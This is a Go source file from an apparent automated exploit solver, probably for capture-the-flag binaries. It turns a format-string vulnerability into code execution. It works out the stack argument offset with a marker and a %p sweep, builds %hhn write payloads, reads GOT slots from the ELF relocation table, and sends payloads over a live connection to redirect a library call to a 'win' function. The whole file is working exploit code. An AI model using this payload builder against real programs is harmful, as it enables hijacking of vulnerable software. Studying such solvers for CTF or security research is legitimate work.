package solve

import (
	"bytes"
	"context"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"sort"
	"strconv"
	"strings"
)

// fmtGotOverwriteStrategy turns a format-string vulnerability into code
// execution by overwriting a GOT entry with the address of a win function. It
// applies to a non-PIE target with a confirmed format string. It first finds the
// argument index at which the format buffer sits, then for each candidate GOT
// entry (functions likely called after the vulnerable printf) and each win
// function, writes the win address over the entry with %hhn byte writes. When the
// program next calls through that entry it runs win instead.
func (s *solver) fmtGotOverwriteStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	if bin.Protections["relro"].Status == "full" {
		s.report.Limitations = append(s.report.Limitations, "full RELRO makes the GOT read-only; GOT-overwrite skipped")
		return false, nil
	}
	if !hasFormatString(s.report.Detection) {
		return false, nil // only when a format string was confirmed (local detection)
	}
	wins := orderedWinFunctions(bin)
	if len(wins) == 0 {
		return false, nil
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	got := pltGotEntries(f)
	f.Close()
	if len(got) == 0 {
		return false, nil
	}
	offset := s.probeFmtOffset(ctx)
	if offset == 0 {
		s.report.Limitations = append(s.report.Limitations, "could not determine the format-string argument offset; GOT-overwrite skipped")
		return false, nil
	}
	for _, gname := range gotTargetOrder(got) {
		gaddr := got[gname]
		for _, win := range wins {
			if err := ctx.Err(); err != nil {
				return false, err
			}
			low := []byte{byte(win.addr), byte(win.addr >> 8), byte(win.addr >> 16)} // low 3 bytes
			payload := fmtstrWrite(offset, gaddr, low)
			if payload == nil || bytes.IndexByte(payload, '\n') >= 0 {
				continue
			}
			note := fmt.Sprintf("got=%s@%#x -> win=%#x(%s) offset=%d", gname, gaddr, win.addr, win.name, offset)
			done, err := s.liveAttempt(ctx, "fmt_got_overwrite", func(_ []uint64) ([]byte, string, bool) {
				return payload, note, true
			})
			if err != nil || done {
				return done, err
			}
		}
	}
	return false, nil
}

// probeFmtOffset sends an 8-byte marker followed by a %p sweep and returns the
// argument index whose value echoes the marker, i.e. where the format buffer
// begins on the stack. Zero means it was not found.
func (s *solver) probeFmtOffset(ctx context.Context) int {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return 0
	}
	defer cleanup()
	defer conn.Close()
	_ = conn.RecvUntilIdle(s.idle())
	marker := "AAAAAAAA"
	var b strings.Builder
	b.WriteString(marker)
	for i := 0; i < 40; i++ {
		b.WriteString("-%p")
	}
	if err := conn.Send([]byte(b.String() + "\n")); err != nil {
		return 0
	}
	out := string(conn.RecvUntilIdle(s.idle()))
	for i, field := range strings.Split(out, "-") {
		m := hexValRe.FindString(field)
		if m == "" {
			continue
		}
		if v, err := strconv.ParseUint(m[2:], 16, 64); err == nil && v == 0x4141414141414141 {
			return i // field i == vararg position (field 0 holds the marker literal)
		}
	}
	return 0
}

// fmtstrWrite builds a format string that writes data to consecutive addresses
// starting at addr, using %hhn, given that the format buffer is vararg number
// offset. The specifier text is placed first (padded to a whole number of stack
// slots), then the target addresses as qwords, so printf finishes the specifiers
// before reaching the null-containing address bytes.
func fmtstrWrite(offset int, addr uint64, data []byte) []byte {
	type w struct {
		idx int
		val int
	}
	for blocks := 2; blocks <= 16; blocks++ {
		argBase := offset + blocks
		ws := make([]w, len(data))
		for i, b := range data {
			ws[i] = w{i, int(b)}
		}
		sort.Slice(ws, func(a, b int) bool { return ws[a].val < ws[b].val }) // ascending so the running count only grows
		var spec bytes.Buffer
		count := 0
		for _, x := range ws {
			pad := (x.val - count) & 0xff
			if pad > 0 {
				fmt.Fprintf(&spec, "%%%dc", pad)
				count += pad
			}
			fmt.Fprintf(&spec, "%%%d$hhn", argBase+x.idx)
		}
		blockLen := blocks * 8
		if spec.Len() > blockLen {
			continue // not enough slots for the specifier text; widen the block
		}
		payload := make([]byte, blockLen)
		copy(payload, spec.Bytes())
		for j := spec.Len(); j < blockLen; j++ {
			payload[j] = 'A'
		}
		for i := range data {
			payload = append(payload, qword(addr+uint64(i))...)
		}
		return payload
	}
	return nil
}

// pltGotEntries maps each PLT-relocated symbol name to its GOT slot address.
func pltGotEntries(f *elf.File) map[string]uint64 {
	out := map[string]uint64{}
	sec := f.Section(".rela.plt")
	if sec == nil {
		return out
	}
	data, err := sec.Data()
	if err != nil {
		return out
	}
	dyn, err := f.DynamicSymbols()
	if err != nil {
		return out
	}
	for i := 0; i+24 <= len(data); i += 24 {
		off := binary.LittleEndian.Uint64(data[i:])
		info := binary.LittleEndian.Uint64(data[i+8:])
		symIdx := int(info >> 32)
		if symIdx >= 1 && symIdx <= len(dyn) {
			if name := dyn[symIdx-1].Name; name != "" {
				out[name] = off
			}
		}
	}
	return out
}

// gotTargetOrder lists GOT entries to try, putting functions commonly called
// after a printf first so the overwrite takes effect promptly.
func gotTargetOrder(got map[string]uint64) []string {
	pref := []string{"printf", "puts", "fflush", "fwrite", "putchar", "exit", "__stack_chk_fail", "write", "fgets", "read", "strlen", "memset"}
	var order []string
	seen := map[string]bool{}
	for _, p := range pref {
		if _, ok := got[p]; ok {
			order = append(order, p)
			seen[p] = true
		}
	}
	rest := []string{}
	for k := range got {
		if !seen[k] {
			rest = append(rest, k)
		}
	}
	sort.Strings(rest)
	return append(order, rest...)
}
